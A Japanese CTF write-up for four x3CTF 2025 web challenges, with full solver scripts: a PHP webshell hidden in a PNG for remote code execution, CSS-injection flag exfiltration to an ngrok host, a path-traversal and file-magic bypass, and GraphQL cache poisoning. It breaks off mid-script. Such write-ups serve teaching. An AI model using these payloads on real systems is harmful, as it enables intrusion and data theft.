---
title: "x3CTF 2025 - writeup"
date: "2025-01-27T00:00:00.000Z"
lang: JA
---

## 🩸 [Web] kittyconvert (204pts 25solves)

[ソースコード](https://github.com/x3ctf/challenges-2025/tree/main/web/kittyconvert/challenge-handout)

開始1時間19分でFirst bloodをいただきました👍

![](/assets/blog/x3c/image.png)

画像をICOファイルに変換してくれるサイト。実行結果は`/uploads`ディレクトリにアップロードされる。コードはPHPで動いているので、どうにかして`.php`ファイルをアップロードしてRCEを行うことが最終目的。


### 解法

目的の`.php`ファイルをアップロードするのには次の２つの障壁がある。

1. ファイル名が以下のコードにより、`.ico`ファイルに書き換わってしまう
  ```php
  $ico_file = "uploads/" . preg_replace("/^(.+)\\..+$/", "$1.ico", basename($_FILES["file"]["name"]));
  ```
  これは、拡張子を除いたファイル名と、拡張子が`.+`にマッチすることが前提となっている。したがって、ファイル名が`.php`の場合、正規表現にマッチせずに`.php`ファイルをアップロードできる。

2. ファイルは、64x64のICOファイルに変換される。ICOファイルは内部にビットマップ形式でデータを保持しているので、そのバイト列が[webshell](https://qiita.com/yukiy4n4g1/items/865ad4c35c2d7deb1c63)になるようにしたい。しかし、ビットマップ形式で送るとファイルサイズが大きすぎてしまう。
  ```php
  if ($_FILES["file"]["size"] > 8000) {
    echo "<p>Sorry, your file is too large you need to buy Nitro.</p>";
  } else {
    // snap
  }
  ```
  そこで、可逆圧縮されるPNGで送ることを考える。次のようなコードでPNGファイルを送ってみる。
  ```python
  webshell = '<?php system($_GET["c"]);?> '
  webshell = list(webshell.encode())
  pixels = [tuple(webshell[i:i+4]) for i in range(0,len(webshell),4)] + ([(0,0,0)] * (64 * 64))
  pixels = pixels[:64*64]

  img = Image.new('RGBA', (64, 64), color=(0, 0, 0))
  img.putdata(pixels)
  buffer = io.BytesIO()
  img.save(buffer, format="PNG")
  b = buffer.getvalue()
  buffer.close()
  ```
  実行結果をxxdで確認すると次のようになる。
  ```
  00004fe0: 00ff 0000 00ff 0000 00ff 0000 00ff 0000  ................
  00004ff0: 00ff 0000 00ff 703f 3c68 7320 7078 6574  ......p?<hs pxet
  00005000: 736c 5f24 2846 5b54 4522 5d22 6328 3e3f  sl_$(F[TE"]"c(>?
  00005010: 3b20 0000 00ff 0000 00ff 0000 00ff 0000  ; ..............
  ```

  どうやら、RGBAの表示順が違うみたいなので、次のように修正する。
  ```python
  webshell = '<?php system($_GET["c"]);?> '
  webshell = list(webshell.encode())
  pixels = [tuple([webshell[i+2],webshell[i+1],webshell[i],webshell[i+3],]) for i in range(0,len(webshell),4)] + ([(0,0,0)] * (64 * 64))
  pixels = pixels[:64*64]
  ```

  すると、形式の違いからか、若干値がずれてしまっていることがわかる。
  ```
  00004fe0: 00ff 0000 00ff 0000 00ff 0000 00ff 0000  ................
  00004ff0: 00ff 0000 00ff 3c3f 7068 7020 7378 7374  ......<?php sxst
  00005000: 656c 2824 5f46 4554 5b22 6322 5d28 3b3f  el($_FET["c"](;?
  00005010: 3e20 0000 00ff 0000 00ff 0000 00ff 0000  > ..............
  ```

  試行錯誤していたところ、値が入る位置によって、値がずれたりずれなかったりすることがわかった。したがって、スペースなどで位置を調整しながら試行錯誤すると、以下のコードで、
  ```python
  webshell = '<?php   system($_GET["c"]); ?>  '
  webshell = list(webshell.encode())
  pixels = [tuple([webshell[i+2],webshell[i+1],webshell[i],webshell[i+3],]) for i in range(0,len(webshell),4)] + ([(0,0,0)] * (64 * 64))
  pixels = pixels[:64*64]
  ```

  次のような完璧なコードが埋め込まれた。

  ```
  00004fe0: 00ff 0000 00ff 0000 00ff 0000 00ff 0000  ................
  00004ff0: 00ff 0000 00ff 3c3f 7068 7020 2020 7379  ......<?php   sy
  00005000: 7374 656d 2824 5f47 4554 5b22 6322 5d29  stem($_GET["c"])
  00005010: 3b20 3f3e 2020 0000 00ff 0000 00ff 0000  ; ?>  ..........
  ```

あとはwebshellを利用して、`/flag.txt`を`/var/www/html/uploads/`にコピーすることで、ファイルそのものを得ることができた。
### 最終的なコード

```python:solver.py
import requests
import io
from PIL import Image

# URL = "https://9e846721-b13c-46b2-b28f-7383764d4309.x3c.tf:1337/"
URL = "http://localhost:8080/"


webshell = '<?php   system($_GET["c"]); ?>  '
webshell = list(webshell.encode())
pixels = [tuple([webshell[i+2],webshell[i+1],webshell[i],webshell[i+3],]) for i in range(0,len(webshell),4)] + ([(0,0,0)] * (64 * 64))
pixels = pixels[:64*64]

img = Image.new('RGBA', (64, 64), color=(0, 0, 0))
img.putdata(pixels)
buffer = io.BytesIO()
img.save(buffer, format="PNG")
b = buffer.getvalue()
buffer.close()

s = requests.session()
r = s.post(URL + "index.php", files={
    "file": (".php", b)
})
r = s.get(URL + 'uploads/.php?c=cp /flag.txt /var/www/html/uploads/')
r = s.get(URL + 'uploads/flag.txt')
print(r.text)
```

## ✅ [Web] blogdog (342pts 11solves)

[ソースコード](https://github.com/x3ctf/challenges-2025/tree/main/web/blogdog/challenge-handout)

::: details 問題設定

![](/assets/blog/x3c/image-1.png)

内容を送ると、DOMPurifyでサニタイズして表示してくれるサイト。Contentのフォームに値を入れるとレンダリングしてくれる他、以下のようにクエリパラメータを利用しても値を指定できる。

```javascript
input.value = decodeURI(window.location.search).replace(/^\?/,'') || SAMPLE_ARTICLE;
```

サニタイズの設定は以下の通り。アトリビュートがすべて禁止されており、`"'&`が取り除かれて`\`や改行コードがバックスラッシュでエスケープされる。

```javascript
const purifyConfig = {
  ALLOWED_ATTR: [],
  ALLOWED_TAGS: ["a", "b", "i", "s", "p", "br", "div", "h1", "h2", "h3", "strike", "strong"],
  ALLOW_ARIA_ATTR: false,
  ALLOW_DATA_ATTR: false,
}

function loadHtml(html) {
  const sanitized = DOMPurify.sanitize(html.replace(/["'&]/g,''), purifyConfig).replace(/["'&]/,'');
  output.innerHTML = `<h2>Sanitized HTML</h2><div id="sanitized"><style nonce="NONCE">#sanitized:before { font-family: monospace; color: #224; content: "${sanitized.replace(/([\\/\n\r\c])/g,'\\$1')}" }</style></div><hr><h2>Rendered HTML</h2>${sanitized}<hr>`;
}

input.oninput = () => loadHtml(input.value);
```

CSPの設定は以下の通り。script-srcやstyle-srcにノンスが設定されていて、inlineが許可されていないのが難しいポイントである。

```javascript
app.get('/', (req, res) => {
  const nonce = crypto.randomBytes(16).toString('base64');  
  res.setHeader('Content-Type', 'text/html');
  res.setHeader('Content-Security-Policy', `script-src 'self' 'nonce-${nonce}'; style-src 'nonce-${nonce}'; object-src 'none'; img-src 'none';`);
  res.send(index.replaceAll("NONCE", nonce));
});
```

`#flag`というフォームがあり、その内容はlocalStorageを通して保存される。

```javascript
flag.oninput = () => localStorage.setItem("flag", flag.value);
/* snap */
window.onload = () => {
  flag.setAttribute('value', localStorage.getItem("flag") ?? "x3c{fake_flag}")
  /* snap */
}
```

BOTはそのフォームを利用してフラグを保存したあと、指定したURLを訪れてくれる。(もともと`x3c{fake_flag}`と入力されているところに入力されるため、フォームには`x3c{fake_flag}x3c{real_flag}`のような内容が入力されることに注意)

```javascript
async function xssbot(url) {
  console.log(`Checking URL: ${url}`);
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    console.log(`URL does not start with 'http(s)://'`);
    return;
  }

  console.log("Launching browser");
  const browser = await puppeteer.launch({
      args: [
        /* snap */
      ],
  });

  console.log(`Setting flag`);
  const context = await browser.createBrowserContext();
  const page = await context.newPage();
  await page.goto("http://localhost:3000/");
  await page.waitForSelector('#flag');
  await page.type('#flag', FLAG);

  console.log(`Opening ${url}`);
  setTimeout(() => {
    try {
      browser.close();
    } catch (err) {
      console.log(`Error: ${err}`);
    }
  }, TIMEOUT);
  try {
    await page.goto(url);
  } catch (err) {
    console.log(`Error: ${err}`);
  }
}
```

:::

### 解法

インラインのスクリプト実行がノンスによる制限があるため難しいので、サニタイズされた内容が`<style>`タグ内にも存在することを利用してCSSインジェクションを目指したい。

```javascript
const sanitized = DOMPurify.sanitize(html.replace(/["'&]/g,''), purifyConfig).replace(/["'&]/,'');
output.innerHTML = `<h2>Sanitized HTML</h2><div id="sanitized"><style nonce="NONCE">#sanitized:before { font-family: monospace; color: #224; content: "${sanitized.replace(/([\\/\n\r\c])/g,'\\$1')}" }</style></div><hr><h2>Rendered HTML</h2>${sanitized}<hr>`;
```

`sanitized`に`"`が含まれている場合、文字列から脱出できることがわかる。しかも、二回目の`.replace(/["'&]/,'')`では`g`フラグが無いため、`"`は一度しか削除されず、２つ目以降の`"`が削除されない。ただし、DOMPurifyに入力される前に`"`がすべて削除されてしまう上に、すべてのアトリビュートが禁止されているため、`DOMPurify.sanitize`の結果に`"`が２つ以上含まれるようにするのが難しい。

[DOMPurifyのソースコード](https://github.com/cure53/DOMPurify/blob/0d64d2b12f9ecaa28899c60aba0b9ed5072c4d93/src/purify.ts#L862)を読んでいると、`is`というアトリビュートは、`element.removeAttribute`で除去することができない(参考: [Stackoverflow](https://stackoverflow.com/questions/75721059/why-remove-attribute-api-not-working-for-is-attribute-alone))ので、変わりに

```javascript
element.setAttribute(name, '');
```
が実行される。
したがって、

```
<a is=x>}[id=flag]{background: red}
```
を送ると、DOMPurifyの実行結果は

```html
<a is="">}[id=flag]{background: red}</a>
```
となる。１つ目の`"`が取り除かれた上で`<style>`タグに埋め込まれると、

```html
<style nonce="...">#sanitized:before { /* snap */ content: "<a is=">}[id=flag]{background: red}</a>" }</style>
```

となり、無事`"`から脱出してCSSインジェクションが可能となる。

これを利用して`#flag`のフォームの中を特定する方法を考える([参考](https://www.mbsd.jp/research/20230403/css-injection/))。まず`[id=flag][value^=x3]`というセレクタは、`#flag`の中身がx3で始まる場合はフォームにマッチし、始まらない場合はマッチしないことを利用する。通常は`background-image`などを利用してリークすることが多いが、今回はCSPにより`image-src`が制限されているため利用できない。したがって、`font-family`を利用する。例えば、CSSが

```CSS
@font-face {
  font-family: x3;
  src: url(https://xxx.ngrok.app/leak?v=x3)
}
[id=flag][value^=x3] {
  font-family: x3
}
```

である場合、`[id=flag][value^=x3]`にマッチする要素がある場合のみ`@font-face`に登録されたフォントに問い合わせが送られる。これを利用して、フラグの文字列の一部が存在するかどうかを判別することができる。

また、`[value^=x3]`のような形でフラグを一文字ずつリークさせたいが、今回は`"`や`\`が利用できないので、`[value^=x3c{]`のセレクタが無効になってしまう。したがって、フラグの一文字目から順番にマッチさせるような手法は取れない。

そこで、`[value*=abc]`は`abc`がフラグのいずれかの場所に存在する場合にマッチすることを利用して次のようなステップで特定する。(この問題のフラグは`^x3c{[a-z0-9_]+}$`を満たす68文字であることに注意)
1. aからzに対して`[value*=a]`のようなセレクタを利用することで、その文字がフラグに含まれるかチェックする。(このとき、数字に関しては`[value*=1]`のように数字から始まる形式のセレクタは無効であるためチェックできない)
2. フラグの`{}`の中身はこの英字から始まると仮定する。
3. その文字から一文字ずつリークし、63文字に達するパターンがあるかどうかをチェックする。

フラグの`{}`の中身が数字から始まる場合はこの手法は使えないが、幸いにもそうではなかったため今回は大丈夫だった。

### 最終的なコード

ちゃんと最後まで計算するとかなり時間がかかるが、途中までの計算結果からフラグは類推可能である。

```python:server.py
import threading
import time
from flask import Flask, Response, jsonify, render_template, request
import requests

app = Flask(__name__)

URL = "http://localhost:3000/"
EVIL = "https://xxx.ngrok.app/"


known=None
used=""
@app.route("/")
def index():
    return render_template("index.html", **globals())

res = []
@app.route("/known")
def known_route():
    global known
    known.append(request.args.get('v'))
    print(known, flush=True)
    return Response("ok")

@app.route("/getknown")
def getknown():
    global known
    if known == None:
        known = list(used)
    return jsonify(known)

@app.route("/complete")
def complete():
    global known
    known = list(filter(lambda k: k != request.args.get('v'), known))
    return jsonify(known)

@app.route("/used")
def used_route():
    global used
    used += request.args.get('v')
    print(used)
    return Response("ok")

@app.route("/getused")
def getused():
    global used
    return Response(used)

def solve():
    while True:
        requests.post(URL, data={
            "content": EVIL
        })
        time.sleep(60)
    pass

 
if __name__ == "__main__":
    thread = threading.Thread(target=solve)
    thread.start()
    app.run(port=9911)
```

```html:index.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

</head>
<body>
    <script>
        const INTERVAL = 1500;
        const sleep = s => new Promise(r => setTimeout(r, s))
        let w;
        (async () => {
            let used = await(await fetch("getused")).text();
            if(used === "") {
                let next_used = "{}";
                while(used != next_used) {
                    used = next_used;
                    const style = "<a is=x>}" + Array.from("abcdefghijklmnopqrstuvwxyz").filter(c => !used.includes(c)).map(c => `@font-face{font-family:${c};src:url({{EVIL}}used?v=${c});}[id=flag][value*=${c}]{font-family:${c}}`).join("");
                    w = open("http://localhost:3000/?" + style);
                    await sleep(INTERVAL);
                    next_used = await(await fetch("getused")).text();
                    w.close()
                }
            }

            let known = await(await fetch("getknown")).json();
            while(known[0].length !== 63) {
                const k = known[0];
                const candidates = Array.from("abcdefghijklmnopqrstuvwxyz0123456789_").map(c => k + c);
                let next_known = known;
                known = [];
                while(known.length != next_known.length) {
                    known = next_known;
                    const style = "<a is=x>}" + candidates.filter(c => !known.includes(c)).map(c => `@font-face{font-family:${c};src:url({{EVIL}}known?v=${c});}[id=flag][value*=${c}]{font-family:${c}}`).join("");
                    w = open("http://localhost:3000/?" + style);
                    await sleep(INTERVAL);
                    next_known = await(await fetch("getknown")).json();
                    w.close();
                }
                known = await(await fetch("complete?v=" + k)).json();
            }
        })()


    </script>
</body>
</html>
```

## 🩸 [Web] mvmcheckers-inc (211pts 24solves)

[ソースコード](https://github.com/x3ctf/challenges-2025/tree/main/web/MVMCheckers-Inc/challenge-handout)

開始5時間26分でFirst bloodをいただきました👍

::: details 問題設定

魔法使いのリストが見られるサイト。

![](/assets/blog/x3c/image-2.png)

魔法使いを登録することもできる。

![](/assets/blog/x3c/image-3.png)

次のように、魔法使いの画像をアップロードすることができ、魔法使いの名前はファイル名で管理されることがわかる。また、ファイルは`file`コマンドによりファイル形式がチェックされ、画像ファイルであることが確認される。

```php:administration.php
$uploadFile = "./magicians/" . $_POST["name"] . ".magic";
$tmpFile = $_FILES["magician"]["tmp_name"];

$mime = shell_exec("file -b $tmpFile");

if (!preg_match('/\w{1,5} image.*/', $mime)) {
    echo "<p>Invalid upload!</p>";
    exit();
}

if (str_contains($uploadFile, "php")) {
    echo "<p>Invalid magician name!</p>";
    exit();
}

echo "<p>";
if (move_uploaded_file($tmpFile, $uploadFile)) {
    echo "Magician successfully uploaded!";
} else {
    echo "Magician upload failed :(";
}
echo "</p>";
?>
```

`/rebuild`というページはメンテナンス中であるメッセージを表示するためのページである。

![](/assets/blog/x3c/image-5.png)

次のように、`/rebuild/?page=booking.json`のような形式で、設定ファイルを参照している。

```php:rebuild/index.php
$pageName = $_GET["page"];

if (!preg_match('/\w{5,10}\.\w{3,5}/', $pageName)) {
    echo "<p>Invalid page name ):</p>";
    exit();
}

$pageString = file_get_contents("./$pageName");
$sanitized = str_replace("\\", "", $pageString);
$pageObject = json_decode($sanitized, flags: JSON_INVALID_UTF8_IGNORE);

if ($pageObject == null) {
    echo "<p>This page does not exist ):</p>";
    exit();
}

function interpret($section) {
    $content = null;

    switch ($section->type) {
        case "text":
            $content = $section->value;
            break;
        case "link":
            $content = file_get_contents($section->value);
            break;
    }

    return "<$section->tag>$content</$section->tag>";
}

echo "<div class='container my-8 text-center'/>";

foreach ($pageObject->sections as $section) {
    echo interpret($section);
}

echo "</div>";
```

フラグは`/flag.txt`にある。

:::

### 解法

`/rebuild/?page=`で次のようなファイルをアップロードできれば、`file_get_contents`を利用してフラグを入手できることがわかる。

```json
{
  "sections": [
    {
      "type": "link", 
      "tag": "i", 
      "value":  "/flag.txt"
    }
  ]
}
```

したがって、ファイルアップロード機能を利用してこのようなjsonをアップロードすることを考える。

`administration.php`でアップロードされるファイル名は次のように定義されるため、拡張子が`.magic`になってしまうが、ディレクトリトラバーサルが可能である。

```php
$uploadFile = "./magicians/" . $_POST["name"] . ".magic";
```

また、`/rebuild`で指定できるファイル名は次の形式であることをチェックする。

```php
if (!preg_match('/\w{5,10}\.\w{3,5}/', $pageName)) {
    echo "<p>Invalid page name ):</p>";
    exit();
}
```

以上より、`administration.php`にアップロードする際に、`$_POST["name"]`が`../xxxxx`にすると、`/var/www/html/xxx.magic`にアップロードされる。また、`/\w{5,10}\.\w{3,5}/`の正規表現は`^`や<code>$</code>のチェックが無いためファイル名のどこかに`\w{5,10}\.\w{3,5}`にマッチする箇所があれば良い。したがって、`$_GET["page"]`を`../xxxxx.magic`にすることにより、そのファイルを読み取ることができる。(`/var/www/html/rebuild/`には権限の問題でアップロードできないので、代わりに`/var/www/html/`にアップロードした。)

次に、`file`コマンドのチェックをバイパスする方法を考える。

`file`コマンドのソースコードを読み、画像と判別される[マジックナンバー](https://ja.wikipedia.org/wiki/%E3%83%9E%E3%82%B8%E3%83%83%E3%82%AF%E3%83%8A%E3%83%B3%E3%83%90%E3%83%BC_(%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%83%E3%83%88%E8%AD%98%E5%88%A5%E5%AD%90))のうち、JSONの中に記載できそうなものを探す。そうすると、「[Kodak Photo CD image pack file](https://github.com/file/file/blob/dcb4d1620b493c15dbb199e5ce93c0848addd26e/magic/Magdir/images#L1431)」のマジックナンバーが2048バイトの位置に`PCD_IPI`であることがわかる。

```
2048	string		PCD_IPI		Kodak Photo CD image pack file
>0xe02	ubyte&0x03	0x00		, landscape mode
>0xe02	ubyte&0x03	0x01		, portrait mode
>0xe02	ubyte&0x03	0x02		, landscape mode
>0xe02	ubyte&0x03	0x03		, portrait mode
```

次のファイルを試してみる。

```python:test.py
file = b"""{"sections": [{"type": "link", "tag": "i", "value":  "/flag.txt", "x": "a"""
file += (b"x" * (2048 - len(file))) + b'PCD_IPI"}]}'
open("test", "wb").write(file)
os.system("file -b test")
```

これは優先順位の関係で、JSONとして判定されてしまう。
```
$ python test.py
JSON text data
```

以下のコードにより、JSONとして評価される前に`\`が取り除かれることがわかる。

```php
$sanitized = str_replace("\\", "", $pageString);
```

したがって、適当な位置に`\`を挿入してJSONとしては無効になれば、代わりにKodak Photo CD image pack fileとして判定されるかもしれない。

```python:test.py
file = b"""\\{"sections": [{"type": "link", "tag": "i", "value":  "/flag.txt", "x": "a"""
file += (b"x" * (2048 - len(file))) + b'PCD_IPI"}]}'
open("test", "wb").write(file)
os.system("file -b test")
```

実験してみると、無事にKodak Photo CD image pack fileとして判定された。
```
$ python test.py
Kodak Photo CD image pack file
```

あとは、これをアップロードして`/rebuild`から読み取ることによりフラグを入手した。

### 最終的なコード

```python:solver.py
import requests

# URL = "https://45e2d4ee-d444-4631-ac4c-c1d2e59daebc.x3c.tf:31337/"
URL = "http://localhost:8080/"
EVIL = "https://tchenio.ngrok.io/"

file = b"""\\{"sections": [{"type": "link", "tag": "i", "value":  "/flag.txt", "x": "a"""
file += (b"x" * (2048 - len(file))) + b'PCD_IPI"}]}'

s = requests.session()
r = s.post(URL + "administration.php", files={
    "magician": ("x", file)
}, data={
    "name": "../xxxxx"
})

r = s.get(URL + "rebuild/?page=../xxxxx.magic")

print(r.status_code)
print(r.text)
```


## ✅ [Web] storycreator (392pts 8solves)

[ソースコード](https://github.com/x3ctf/challenges-2025/tree/main/web/StoryCreator/challenge-handout/handout)

::: details 問題設定

Story(?)を作成し、画像にレンダリングできるサイト。フロントエンドは[@apollo/client](https://www.apollographql.com/docs/react)を、サーバーは[99design/gqlgen](https://github.com/99designs/gqlgen)を利用している。

![](/assets/blog/x3c/image-4.png)

Storyの作成方法は次の通り。

1. 画像をアップロードする。
2. Storyを作成する。
  ```go:backend/pkg/graph/schema.resolver.go
  func (r *mutationResolver) CreateStory(ctx context.Context, story model1.StoryInput) (*stories.Story, error) {
    tenantID := tenant.GetTenantID(ctx)
    createdStoryID, err := r.DB.Stories.NewStory(ctx, tenantID, stories.Story{
      Text:    story.Text,
      Action:  story.Action,
      ImageID: int64(story.Image),
    })
    if err != nil {
      return nil, err
    }
    loadedStory, err := r.DB.Stories.GetStory(ctx, tenantID, createdStoryID)
    if err != nil {
      return nil, err
    }
    return loadedStory, nil
  }
  ```
3. `createStoryExport`を実行し、Storyの出力をキューする。
  ```go:backend/pkg/graph/schema.resolver.go
  func (r *mutationResolver) CreateStoryExport(ctx context.Context, export model1.StoryExportInput) (*exports.Export, error) {
    tenantID := tenant.GetTenantID(ctx)
    exportID, err := r.DB.Exports.NewExport(ctx, tenantID, exports.Export{
      StoryID:    int64(export.StoryID),
      Dimensions: export.Dimensions,
    })

    if err != nil {
      return nil, err
    }

    loadedExport, err := r.DB.Exports.GetExport(ctx, tenantID, exportID)
    if err != nil {
      return nil, err
    }

    return loadedExport, nil
  }
  ```
4. 30秒に一度、キューが実行されStoryがレンダリングされる。
  ```go:backend/pkg/internal/exporter/exporter.go
  func (e *exporter) runExport(ctx context.Context, export exports.Export) error {
    ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
    defer cancel()
    if err := e.repository.UpdateExportStatus(ctx, export.ID, "task picked up"); err != nil {
      return fmt.Errorf("failed to update export status: %w", err)
    }
    img, err := e.renderer.RenderStory(ctx, export.TenantID, export.StoryID)
    if err != nil {
      if err := e.repository.UpdateExportStatus(ctx, export.ID, "failed to render story to image"); err != nil {
        return fmt.Errorf("failed to update export status: %w", err)
      }
      return fmt.Errorf("failed to render story to image: %w", err)
    }
    if err := e.repository.MarkExportReady(ctx, export.ID, img); err != nil {
      return fmt.Errorf("failed to mark export ready: %w", err)
    }
    return nil
  }
  ```
5. `api/export/<id>`にアクセスすると、レンダリング結果が表示される。

レンダリングは[Rod](https://github.com/go-rod/rod)というスクレイピング用のライブラリが利用される。また、この際のクッキーにフラグが含まれている。
```go:backend/pkg/render/render.go
func (e *renderer) RenderStory(ctx context.Context, tenantID string, storyID int64) ([]byte, error) {

	path, _ := launcher.LookPath()
	launcher := launcher.New().Bin(path).Headless(true)
	u := launcher.MustLaunch()
	browser := rod.New().ControlURL(u).Trace(true).MustConnect()
	log.Printf("Rendering story %d to image", storyID)
	defer browser.MustClose()

	storyURL := getURL(e.url, storyID)

	browser.SetCookies([]*proto.NetworkCookieParam{
		{
			Name:  "tenantID",
			Value: tenantID,
			URL:   storyURL,
		},
		{
			Name:  "flag",
			Value: e.flag,
			URL:   storyURL,
		},
	})
	log.Printf("Opening story %d at %s", storyID, storyURL)
	page, err := browser.Timeout(5 * time.Second).Page(proto.TargetCreateTarget{URL: storyURL})
	if err != nil {
		return nil, fmt.Errorf("failed to open page: %w", err)
	}
	elem, err := page.Timeout(5 * time.Second).Element("#story-card")
	if err != nil {
		return nil, fmt.Errorf("failed to find element: %w", err)
	}
	buf, err := elem.Screenshot(proto.PageCaptureScreenshotFormatPng, 90)
	if err != nil {
		return nil, fmt.Errorf("failed to screenshot: %w", err)
	}

	log.Printf("Rendering story %d completed successfully", storyID)
	return buf, nil
}

func getURL(url string, storyID int64) string {
	return fmt.Sprintf("%s/render/%d", url, storyID)
}
```

このクッキーは、`flag`というリゾルバで取得することができる。
```go
func (r *queryResolver) Flag(ctx context.Context) (string, error) {
	flag := flagcookie.GetFlagCookie(ctx)
	return flag, nil
}
```

`/render/<id>`は次のコードでレンダリングを行う。
```typescript:frontend/src/pages/Render/Render.tsx
export function Render() {
  const { id } = useParams();
  const [loading, setLoading] = useState(true);
  const [data, setData] = useState<Response | null>(null);
  const [error, setError] = useState<Error | null>(null);
  useEffect(() => {
    const ac = new AbortController();
    setLoading(true);
    fetch(import.meta.env.VITE_API_URL + "/graphql", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        query: "",
        variables: { id },
        extensions: {
          persistedQuery: {
            version: 1,
            sha256Hash:
              "d15293ae32151343d3a893f1c0417f664d573ae322394c44ce30b002ad6e22c9",
          },
        },
      }),
      signal: ac.signal,
    })
      .then((data) => data.json())
      .then((data) => {
        if (data.errors && data.errors.length > 0) {
          if (data.errors[0].message === "PersistedQueryNotFound") {
            /* persistedQueryがヒットしなかった際のコード */ 
          }
        }
        return data;
      })
      .then((data) => {
        setData(data.data);
        setLoading(false);
        setError(null);
      });

    return () => {
      ac.abort("useEffect cancellation");
      setLoading(false);
    };
  }, [id]);

  if (loading) {
    return <FullPageLoading />;
  }

  return (
    <>
      {error && <Alert severity="error">Error: {error.message}</Alert>}
      {data && (
        <RenderStory
          story={data.story}
          fields={data as unknown as Record<string, string>}
        />
      )}
    </>
  );
}
```

```typescript:frontend/src/components/story.tsx
export function RenderStory(props: {
  story: {
    id: number;
    text: string;
    action: string;
    image: { url: string };
  };
  fields: Record<string, string>;
}) {
  const template = props.story.text;
  const text = props.fields
    ? template.replace(/{{(.*?)}}/g, (_, key) => props.fields[key] ?? "")
    : template;
  return (
    <StoryCard
      id="story-card"
      backgroundImage={import.meta.env.VITE_API_URL + props.story.image.url}
    >
      <StoryID>ID: {props.story.id}</StoryID>
      <StoryText>{text}</StoryText>
      <StoryAction>{props.story.action}</StoryAction>
    </StoryCard>
  );
}
```

[Persisted Queries](https://www.apollographql.com/docs/kotlin/advanced/persisted-queries)とは、Apollo GraphQLの概念のひとつで、一般的なGraphQLのクエリ文で問い合わせるのではなく、クエリ文とそのハッシュ(SHA-256)をサーバーに保存しておくことにより、そのハッシュで問い合わせを行うことができるという仕組みである。

キャッシュは、次のコードにより実現されている。

```go:backend/pkg/apq/cache.go
type APQCache struct {
	queries smallhmap.SmallHmap
}

// Add implements graphql.Cache.
func (a *APQCache) Add(ctx context.Context, key string, value any) {
	t := tenant.GetTenantID(ctx)
	key = t + key
	a.queries.Add(ctx, key, value)
}

// Get implements graphql.Cache.
func (a *APQCache) Get(ctx context.Context, key string) (value any, ok bool) {
	t := tenant.GetTenantID(ctx)
	key = t + key
	return a.queries.Get(ctx, key)
}

var _ graphql.Cache = (*APQCache)(nil)

func NewAPQCache() graphql.Cache {
	return &APQCache{queries: smallhmap.New()}
}
```

```go:backend/pkg/smallhmap/smallhmap.go
type SmallHmap interface {
	Add(ctx context.Context, key string, value any)
	Get(ctx context.Context, key string) (value any, ok bool)
}

const MAX_SIZE = 5000

// Constant size O(1) hash map
// Uses short keys for optimized performance
// Optimized for web
type smallHmap struct {
	queries map[uint64]any
}

// Add implements SmallHmap.
func (s *smallHmap) Add(ctx context.Context, key string, value any) {
	smallKey := makeKeySmaller(key)
	s.queries[smallKey] = value
}

// Get implements SmallHmap.
func (s *smallHmap) Get(ctx context.Context, key string) (value any, ok bool) {
	smallKey := makeKeySmaller(key)
	res := s.queries[smallKey]

	if res == nil {
		return nil, false
	}
	if res, ok := res.(string); ok && res == "" {
		log.Printf("empty string for key %s", key)
		return nil, false
	}
	return res, true
}

func New() SmallHmap {
	return &smallHmap{queries: make(map[uint64]any)}
}

func makeKeySmaller(key string) uint64 {
	sum := uint64(0)
	for _, c := range key {
		sum += uint64(c)
	}
	return sum % MAX_SIZE
}
```

:::

### 解法

レンダリング時には、`d15293ae32151343d3a893f1c0417f664d573ae322394c44ce30b002ad6e22c9`という固定のハッシュを利用してPersisted Queriesの問い合わせを行っている。キャッシュポイズニングを利用して、このときに実行されるクエリを書き換えることはできないだろうか。

ハッシュからキャッシュの辞書に問い合わせが送られる箇所を見ると、セッションごとに付与される`tenantID`と結合して問い合わせが行われれていることがわかる。
```go:backend/pkg/apq/cache.go
func (a *APQCache) Get(ctx context.Context, key string) (value any, ok bool) {
	t := tenant.GetTenantID(ctx)
	key = t + key
	return a.queries.Get(ctx, key)
}
```

さらに、`smallhmap`では、このキーが`文字コードの和 % 5000`に圧縮されることがわかる。

```go:backend/pkg/smallhmap/smallhmap.go

// Get implements SmallHmap.
func (s *smallHmap) Get(ctx context.Context, key string) (value any, ok bool) {
	smallKey := makeKeySmaller(key)
	res := s.queries[smallKey]
  /* snap */
}

/* snap */

func makeKeySmaller(key string) uint64 {
	sum := uint64(0)
	for _, c := range key {
		sum += uint64(c)
	}
	return sum % MAX_SIZE
}
```

`tenantID`はクッキーを編集することによって自由に指定可能である。`"d15293ae32151343d3a893f1c0417f664d573ae322394c44ce30b002ad6e22c9" + <ユーザーAのtenantID>`と`<実際に贈りたいクエリのハッシュ> + <ユーザーBのtenantID>`の`<文字コードの和> % 5000`の値が一致するようにtenantIDを調整することにより、ハッシュを衝突させることができる。そして、ユーザーAでレンダリングを行うことにより、レンダリングする際のBOTが自分が生成したクエリを読み込むようにできる。

ストーリーの`text`はテンプレート機能のようなものがあり、これを利用してクエリの結果を描画することができる。

```typescript:frontend/src/components/story.tsx
const text = props.fields
  ? template.replace(/{{(.*?)}}/g, (_, key) => props.fields[key] ?? "")
  : template;
```

textが`{{flag}}`であるようなストーリーを作成したあと、次のようなクエリを送る。($idはそのストーリーのID)
```
query Q($id: Int!){ 
    flag
    story(id: $id) {
        id
        text
        image {
            url
        }
    }
}
```

すると次のような結果が帰ってくる
```json
{
  "data":{
    "flag":"CTE24{flag}",
    "story":{
      "id":3,
      "text":"{{flag}}",
      "image":{
        "url":"/images/2"
      }
    }
  }
}
```

レンダリング時に`text`は置き換えられて、`CTE24{flag}`となる。これをキャッシュポイズニングを利用してBOTに読み込ませることができれば、レンダリング結果にフラグが表示される。


### 最終的なコード
```python
import hashlib
import requests
import time

# URL = "https://378efb45-ee84-4695-a990-dc6042a26a48.x3c.tf:1337/"
URL = "http://13.230.77.32:8080/"


def sendGraphql(query, s, variables={}, extensions={}):
    return s.post(
        URL + "api/graphql",
        json={"query": query, "variables": variables, "extensions": extensions},
    )


s1 = requests.session()
s1.cookies["tenantID"] = "azzzz"
target_hash = "d15293ae32151343d3a893f1c0417f664d573ae322394c44ce30b002ad6e22c9"
char_sum = sum([ord(c) for c in target_hash + s1.cookies["tenantID"]])

query = """
query Q($id: Int!){ 
